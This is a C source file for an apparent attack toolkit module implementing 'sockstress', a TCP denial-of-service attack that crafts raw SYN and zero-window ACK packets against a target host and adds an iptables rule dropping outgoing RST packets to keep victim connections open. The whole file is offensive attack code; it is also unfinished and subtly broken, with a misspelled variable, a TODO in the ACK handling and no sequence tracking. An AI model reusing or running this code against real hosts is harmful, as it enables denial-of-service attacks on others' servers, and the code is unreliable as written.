#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <lib/info.h>
#include <lib/mem.h>
#include <lib/net.h>
#include <lib/util.h>

#include "sockstress.h"

// sock_cfg_t 
typedef struct sock_cfg_t{
	int socket;	 
	struct sockaddr_in in;
	struct iphdr *iph;
	struct tcphdr *tcph;
	uint8_t *datagram;
	uint16_t datagram_len;
} sock_cfg_t;

// sockstress global config
static sock_cfg_t *conf;

static void send_tcp_syn(sock_cfg_t *cfg)
{
	if (!cfg)
		INFOEE("Cannot send SYN TCP because cfg is NULL");

	cfg->tcph->th_sport = htons(U16_RAND());
	cfg->tcph->th_seq   = htonl(U32_RAND());
	cfg->tcph->th_flags = TH_SYN;
	cfg->tcph->th_win   = htons(TCP_MAXWIN);
	cfg->tcph->th_sum   = tcp4_checksum(cfg->iph, cfg->tcph);
	
	if (sendto(cfg->socket, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->in, sizeof(cfg->in)) < 0)
		INFOEE("Cannot send syn packet");
}

static void recv_tcp_ack(sock_cfg_t *cfg)
{
	if (!cfg)
		INFOEE("Cannot recvive ACK TCP because cfg is NULL");

	char datagram[IP_MAXPACKET];
	socklen_t len = sizeof(cfg->in);
	if (recvfrom(cfg->socket, datagram, IP_MAXPACKET, 0, (struct sockaddr *)&cfg->in, &len) < 0)
		INFOEE("Cannot recvive ack packet");

	// unpack only tcp part
	struct tcphdr *tcph = (struct tcphdr *)(datagrm + sizeof(struct iphdr));
	// TODO
}

static void send_tcp_ack(sock_cfg_t *cfg)
{
	if(!cfg)
		INFOEE("Cannot send ACK TCP because cfg is NULL");

	cfg->tcph->th_flags = TH_ACK;
	cfg->tcph->th_win   = htons(0); /*this*/
	cfg->tcph->th_sum   = tcp4_checksum(cfg->iph, cfg->tcph);

	if (sendto(cfg->socket, cfg->datagram, cfg->datagram_len, 0, (struct sockaddr *)&cfg->in, sizeof(cfg->in)) < 0)
		INFOEE("Cannot send syn packet");
}

/**
 * sockstress_init
 *
 * the method will initialize the procedure 
 * based on the args specified by the caller, 
 * this will create the sockets, create the internal buffers
 * and adding extra iptables rules in order 
 * to block the kernel for sending RST to the remote victim
 */
static void sockstress_init(arguments args)
{
	int err = system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null");
	if (!WIFEXITED(err)) {
		INFOEE("Cannot set the firewall to drop all rst's");
	}
	if (err == -1)
		INFOEE("Please check if iptables is installed and if this program is runned as root");

	// start seeding the random generator
	random_seed();

	struct sockaddr_in daddr;
	memset(&daddr, 0, sizeof(daddr));
	daddr.sin_family = AF_INET;
	daddr.sin_port   = htons(args.port.n);
	// we don't need to check once more this.
	inet_pton(daddr.sin_family, args.host, &daddr.sin_addr.s_addr); 

	// find the interface with the args.inf name and get the ip address in ipv4 form
	in_addr_t saddr = addr_if(args.inf, AF_INET);
	if (saddr == 0)
		INFOEE("Cannot retrive source address from interface list");

	// create - alloc the socket.
	int sk = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sk < 0)
		INFOEE("Cannot create the socket");

	// notify the kernel that we want to manually construct the ip header
	int on = 1;
	if (setsockopt(sk, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
		INFOEE("Cannot set socket option to include ip header");

	// fill up the ip header
	struct iphdr iph;
	memset(&iph, 0, sizeof(iph));
	iph.version  = 4; /* ipv version 4 */
	iph.ihl		 = 5; /* 20 bytes ip header length */
	iph.tos		 = 0;
	iph.ttl		 = 0xFF; /* 255 time to live */
	iph.frag_off = htons(0x4000); /* Do not fragment */
	iph.tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph.id		 = htons(U16_RAND());
	iph.saddr	 = saddr;
	iph.daddr	 = daddr.sin_addr.s_addr;
	iph.protocol = IPPROTO_TCP;
	iph.check	 = ip4_checksum(&iph);

	struct tcphdr tcph;
	memset(&tcph, 0, sizeof(tcph));
	tcph.th_dport = daddr.sin_port;
	tcph.th_ack   = htonl(0);
	tcph.th_x2	  = 0;
	tcph.th_off   = 5;
	tcph.th_win   = htons(TCP_MAXWIN);
	tcph.th_urp   = htons(0);

	if (!conf)
		conf = xzmalloc(sizeof(*conf));
	else 
		DEBUG("Already the internal sockstress configuration is initialized");

	if(!conf->datagram) {
		conf->datagram_len = sizeof(*conf->datagram) * (sizeof(struct iphdr) + sizeof(struct tcphdr));
		conf->datagram = xzmalloc(conf->datagram_len);
	} else
		DEBUG("Already the internal datagram buffer initialized");

	memcpy(&conf->in, &daddr, sizeof(daddr));
	conf->socket = sk;
	memcpy(conf->datagram, &iph, sizeof(iph));
	conf->iph = (struct iphdr *)(conf->datagram);
	memcpy(conf->datagram+sizeof(iph), &tcph, sizeof(tcph));
	conf->tcph = (struct tcphdr *)(conf->datagram+sizeof(iph));
}

/**
 * sockstress_attack
 *
 */
static void sockstress_attack(void)
{
	send_tcp_syn(conf);
	recv_tcp_ack(conf);
	send_tcp_ack(conf);
}

/**
 * sockstress_cleanup
 *
 * Method for providing the cleanup process after 
 * the attack has been stopped. This will close all the sockets, 
 * frees up the buffers and removes any added iptable rules.
 */
static void sockstress_cleanup(void)
{
	int err = system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null");
	if (!WIFEXITED(err))
		INFOEE("Could not set the firewall to drop all rst's");

	xfree(conf->datagram);
	if (close(conf->socket) < 0) 
		INFOEE("Cannot close the socket");
	xfree(conf);
}

impl_t *sockstress_new()
{
	impl_t *impl = NULL;
	impl		 = xzmalloc(sizeof(*impl));
	impl->init   = sockstress_init;
	impl->attack = sockstress_attack;
	impl->clean  = sockstress_cleanup;

	return impl;
}
